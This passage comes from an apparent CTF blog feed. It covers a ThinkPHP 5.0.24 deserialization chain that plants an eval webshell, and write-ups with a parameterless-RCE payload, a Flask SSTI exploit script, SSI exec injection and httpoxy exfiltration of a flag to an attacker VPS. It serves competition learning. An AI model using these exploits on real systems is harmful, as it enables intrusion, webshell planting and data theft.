class="keyword">$this</span>-&gt;tag) &#123;</span><br><span class="line">        <span class="variable">$key</span>       = <span class="string">&#x27;tag_&#x27;</span> . md5(<span class="keyword">$this</span>-&gt;tag);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;has(<span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span>   = explode(<span class="string">&#x27;,&#x27;</span>, <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>));</span><br><span class="line">            <span class="variable">$value</span>[] = <span class="variable">$name</span>;</span><br><span class="line">            <span class="variable">$value</span>   = implode(<span class="string">&#x27;,&#x27;</span>, array_unique(<span class="variable">$value</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;set(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进getCacheKey()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$auto</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = md5(<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) &#123;</span><br><span class="line">        <span class="comment">// 使用子目录</span></span><br><span class="line">        <span class="variable">$name</span> = substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . substr(<span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . DS . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$dir</span>      = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">        mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;options[‘path’]是可控的，可通过php伪协议绕过$data中的exit()</p><p>windows下payload：<code>$this-&gt;options[&#39;path&#39;]=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php</code></p><p>linux下payload：<code>$this-&gt;options[&#39;path&#39;]=php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_CBFG[pzq]);?&gt;</code></p><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];<span class="comment">//触发Model __toString(),子类Pivot合适</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;<span class="comment">#Relation</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query();<span class="comment">#class Query</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;<span class="comment">#OneToOne HasOne</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&quot;no&quot;</span>,<span class="string">&quot;123&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;<span class="comment">#Output</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();<span class="comment">//目的调用其write()</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;<span class="comment">#Model</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$parent</span>;<span class="comment">#修改处</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aaaaa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Output();<span class="comment">#Output对象,目的是调用__call()</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();<span class="comment">//Relation子类,且有getBindAttr()</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;<span class="comment">//isSelfRelation()</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;<span class="comment">#Query</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model = <span class="keyword">new</span> Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;<span class="comment">#Memcached</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();<span class="comment">//目的调用File-&gt;set()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;<span class="comment">#File</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure><p>将poc得到的结果作为变量c传入，会在/public目录下生成三个文件</p><p>有shell的文件名称为<code>&#39;a.php&#39;.md5(&#39;tag_&#39;.md5($this-&gt;tag)).&#39;.php&#39;</code>，访问即可</p><p><img src="/2022/01/16/thinkphp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20220117144927846.png" alt="image-20220117144927846"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;比赛遇到的一个thinkphp框架的考点，在网上找到一些大佬的文章，把漏洞复现一下，整个漏洞利用的流程走一遍&lt;/p&gt;
&lt;h1 id=&quot;复现环</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>长安战疫Web部分</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/</id>
    <published>2022-01-12T11:54:37.000Z</published>
    <updated>2022-01-15T04:06:30.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>php无参数rce，过滤了一些常用的函数，想办法绕过即可</p><p>payload:<code>code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&amp;a=system(&#39;cat flag.php&#39;);</code></p><p><a href="https://www.freebuf.com/articles/network/242482.html">无参数读文件和RCE总结</a></p><h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112133745936.png" alt="image-20220112133745936"></p><p>提示转去<code>/admin</code>路由，转到<code>/admin?static.js?</code>，成功登录，根据提示是用name来ssti</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112135750755.png" alt="image-20220112135750755"></p><p>双下划线<code>__</code>被过滤，参考大佬的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://0932a3a1.lxctf.net&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;name1&#x27;</span>:<span class="string">&#x27;__class__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name2&#x27;</span>: <span class="string">&#x27;__base__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name3&#x27;</span>: <span class="string">&#x27;__subclasses__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name4&#x27;</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name5&#x27;</span>: <span class="string">&#x27;__init__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name6&#x27;</span>: <span class="string">&#x27;__globals__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name7&#x27;</span>: <span class="string">&#x27;__builtins__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name8&#x27;</span>: <span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name9&#x27;</span>: <span class="string">&#x27;/flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name10&#x27;</span>: <span class="string">&#x27;read&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">payload=<span class="string">&#x27;/admin?name=&#123;&#123;()|attr(request.headers.name1)|attr(request.headers.name2)|attr(request.headers.name3)()|attr(request.headers.name4)(186)|attr(request.headers.name5)|attr(request.headers.name6)|attr(request.headers.name4)(request.headers.name7)|attr(request.headers.name4)(request.headers.name8)(request.headers.name9)|attr(request.headers.name10)()&#125;&#125;&amp;.js?&#x27;</span></span><br><span class="line">r=requests.get(url+payload,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h1 id="Flag配送中心"><a href="#Flag配送中心" class="headerlink" title="Flag配送中心"></a>Flag配送中心</h1><p>查看网页源码可得提示php版本与通信接口协议fastcgi</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112144138763.png" alt="image-20220112144138763"></p><p>考察的是漏洞<code>cve-2016-5385</code>，在vps上开启端口监听，抓包，在文件头添加<code>Proxy: http://vps:port</code>，发送request报文后即可在vps监听到flag</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112152203716.png" alt="image-20220112152203716"></p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112152217213.png" alt="image-20220112152217213"></p><h1 id="Shiro-未完成"><a href="#Shiro-未完成" class="headerlink" title="Shiro?(未完成)"></a>Shiro?(未完成)</h1><h1 id="Baby-Upload"><a href="#Baby-Upload" class="headerlink" title="Baby_Upload"></a>Baby_Upload</h1><p>.htaccess,ini,php等均被过滤，未过滤shtml文件，可以进行ssi注入</p><p>上传<code>&lt;!--#exec cmd=&quot;dir /&quot; --&gt;</code>，得到flag文件名称</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220113134447628.png" alt="image-20220113134447628"></p><p>再上传<code>&lt;!--#exec cmd=&quot;cut -b 1-100 /ffffff?llll11111aaaaa4444ggggg&quot; --&gt;</code>,得到flag</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220113135151088.png" alt="image-20220113135151088"></p><p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">SSI注入漏洞总结</a></p><h1 id="tp-未完成"><a href="#tp-未完成" class="headerlink" title="tp(未完成)"></a>tp(未完成)</h1><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220114131205627.png"></p><p>访问<code>public/index.php/index/index/upload</code>，得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$FILES</span>= <span class="variable">$_FILES</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="variable">$_GET</span>,<span class="variable">$_POST</span>) <span class="keyword">as</span> <span class="variable">$_request</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) &#123;</span><br><span class="line">                $&#123;<span class="variable">$_k</span>&#125; = <span class="keyword">$this</span>-&gt;func(<span class="variable">$_v</span>);</span><br><span class="line">                <span class="comment">//$_request[$_k] =  $&#123;$_k&#125;;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = @<span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$filename</span> = @<span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;name&quot;</span>].<span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">        move_uploaded_file(<span class="variable">$file</span>,<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;noPHP&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">&amp;<span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array(<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$var</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)&#123;</span><br><span class="line">                <span class="variable">$var</span>[<span class="variable">$_k</span>] = <span class="keyword">$this</span>-&gt;func(<span class="variable">$_v</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$var</span> = addslashes(<span class="variable">$var</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>存在变量覆盖，且可以通过unlink触发phar协议</p><p>又有tp版本为5.0.24</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220114140232863.png" alt="image-20220114140232863"></p><p>找tp5.0.24反序列化的poc，修改一下在本地生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 